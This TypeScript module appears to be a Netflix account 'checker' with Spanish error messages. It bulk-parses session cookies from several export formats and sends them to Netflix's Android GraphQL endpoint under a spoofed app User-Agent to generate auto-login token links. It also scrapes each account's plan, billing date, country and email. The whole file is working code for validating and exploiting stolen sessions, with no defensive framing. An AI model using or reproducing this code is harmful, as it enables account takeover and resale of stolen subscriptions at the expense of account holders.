import axios from 'axios'

// ── Types ────────────────────────────────────────────────────────────────────
interface CookieDict { [key: string]: string }

export interface NFTokenResult {
  success: boolean
  token?: string
  link?: string
  error?: string
}

export interface NetflixMetadata {
  success: boolean
  country?: string
  countryName?: string
  plan?: string
  planPrice?: string
  videoQuality?: string
  maxStreams?: string
  nextBillingDate?: string
  memberSince?: string
  email?: string
  error?: string
}

export interface CheckResult {
  success: boolean
  token?: string
  link?: string
  metadata?: NetflixMetadata
  error?: string
}

// ── Cookie Extraction ────────────────────────────────────────────────────────
export function extractCookiesFromText(text: string): CookieDict | null {
  // JSON format (Cookie Editor export)
  try {
    const data = JSON.parse(text)
    if (Array.isArray(data)) {
      const cd: CookieDict = {}
      for (const item of data) {
        if (item?.name && item?.value &&
          ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'].includes(item.name))
          cd[item.name] = item.value
      }
      if (cd.NetflixId) return cd
    }
  } catch {}

  // Netscape format
  if (text.includes('\t') && (text.includes('NetflixId') || text.includes('nfvdid'))) {
    const cd: CookieDict = {}
    for (const line of text.split('\n')) {
      if (!line.trim() || line.startsWith('#')) continue
      const parts = line.trim().split('\t')
      if (parts.length >= 7) cd[parts[5]] = parts[6]
    }
    if (cd.NetflixId) return cd
  }

  // Raw string format
  const cd: CookieDict = {}
  for (const [name, regex] of Object.entries({
    nfvdid: /nfvdid=([^;]+)/,
    NetflixId: /NetflixId=([^;]+)/,
    SecureNetflixId: /SecureNetflixId=([^;]+)/,
    OptanonConsent: /OptanonConsent=([^;]+)/,
  })) {
    const m = text.match(regex as RegExp)
    if (m) cd[name] = m[1]
  }
  if (cd.NetflixId) return cd

  return null
}

export function extractCookiesFromBlock(text: string): CookieDict[] {
  const results: CookieDict[] = []
  if (!text || !text.trim()) return results

  const blocks = text.split(/\n\s*\n/)
  for (const block of blocks) {
    const trimmed = block.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const dict = extractCookiesFromText(trimmed)
    if (dict) {
      results.push(dict)
      continue
    }
    const lines = trimmed.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'))
    for (const line of lines) {
      const lineDict = extractCookiesFromText(line)
      if (lineDict) results.push(lineDict)
    }
  }
  return results
}

// ── Cookie String Builder ────────────────────────────────────────────────────
export function buildCookieString(cd: CookieDict, onlyAndroid = false): string {
  const keys = onlyAndroid ? ['NetflixId', 'SecureNetflixId', 'nfvdid'] : Object.keys(cd)
  return keys.filter(k => cd[k]).map(k => `${k}=${cd[k]}`).join('; ')
}

// ── NFToken Generation ───────────────────────────────────────────────────────
export async function generateToken(cd: CookieDict): Promise<NFTokenResult> {
  const missing = ['NetflixId', 'SecureNetflixId', 'nfvdid'].filter(k => !cd[k])
  if (missing.length) return { success: false, error: `Faltan cookies: ${missing.join(', ')}` }

  try {
    const { data } = await axios.post(
      'https://android13.prod.ftl.netflix.com/graphql',
      {
        operationName: 'CreateAutoLoginToken',
        variables: { scope: 'WEBVIEW_MOBILE_STREAMING' },
        extensions: {
          persistedQuery: {
            version: 102,
            id: '76e97129-f4b5-41a0-a73c-12e674896849',
          },
        },
      },
      {
        headers: {
          'User-Agent':
            'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
          'Content-Type': 'application/json',
          Cookie: buildCookieString(cd, true),
        },
        timeout: 30000,
      }
    )

    const token = data?.data?.createAutoLoginToken
    if (token) {
      return { success: true, token, link: `https://netflix.com/?nftoken=${token}` }
    }
    return { success: false, error: 'Sin token en respuesta' }
  } catch (e: any) {
    return { success: false, error: e.response?.data?.message || e.message || 'Error de red' }
  }
}

// ── Netflix Metadata ─────────────────────────────────────────────────────────
export async function getMetadata(cd: CookieDict): Promise<NetflixMetadata> {
  try {
    const res = await axios.get('https://www.netflix.com/account/membership', {
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        Cookie: buildCookieString(cd),
      },
      maxRedirects: 0,
      validateStatus: (s: number) => s < 400,
      timeout: 20000,
    })

    if (res.status >= 300) return { success: false, error: 'Cookie inválida (redirect)' }

    const html: string = res.data
    const match = html.match(/netflix\.reactContext\s*=\s*(\{.+?\})(?=;\s*<\/script>)/s)
    if (!match) return { success: false, error: 'No se pudo extraer metadata' }

    const rc = JSON.parse(
      match[1].replace(
        /\\x([0-9a-fA-F]{2})/g,
        (_: string, h: string) => String.fromCharCode(parseInt(h, 16))
      )
    )

    const models = rc?.models || {}
    const sc = models?.signupContext?.data || {}
    const fields = sc?.flow?.fields || {}
    const plan = fields?.currentPlan?.fields || {}
    const dig = (obj: any, ...keys: string[]): any =>
      keys.reduce((o, k) => (o && typeof o === 'object' ? o[k] : undefined), obj)

    return {
      success: true,
      country: dig(sc, 'userInfo', 'countryOfSignup'),
      plan: plan?.localizedPlanName?.value,
      planPrice: plan?.planPrice?.value,
      videoQuality: plan?.videoQuality?.value,
      maxStreams: plan?.maxStreams?.value,
      nextBillingDate: plan?.nextBillingDate?.value || fields?.nextBillingDate?.value,
      memberSince: plan?.memberSince?.value
        ? new Date(plan.memberSince.value).toISOString().split('T')[0]
        : undefined,
      email: models?.accountInfo?.data?.emailAddress,
    }
  } catch (e: any) {
    return { success: false, error: e.message }
  }
}

// ── Full Check (Token + Metadata) ────────────────────────────────────────────
export async function fullCheck(cookieText: string): Promise<CheckResult> {
  const cd = extractCookiesFromText(cookieText)
  if (!cd) return { success: false, error: 'No se pudieron extraer cookies válidas' }

  const tokenResult = await generateToken(cd)
  if (!tokenResult.success) return { success: false, error: tokenResult.error }

  const metadata = await getMetadata(cd)

  return {
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  }
}

// ── Helpers ──────────────────────────────────────────────────────────────────
export function getPlanType(planName: string): string {
  if (!planName) return 'Unknown'
  const p = planName.toLowerCase()
  if (p.includes('premium')) return 'Premium'
  if (p.includes('standard')) return 'Standard'
  if (p.includes('basic')) return 'Basic'
  if (p.includes('essential')) return 'Essential'
  if (p.includes('mobile')) return 'Mobile'
  return planName
}

export function getProgressBar(current: number, total: number, length = 10): string {
  const percent = total > 0 ? current / total : 0
  const filled = Math.floor(length * percent)
  return `[${'▓'.repeat(filled)}${'░'.repeat(length - filled)}] ${Math.floor(percent * 100)}%`
}
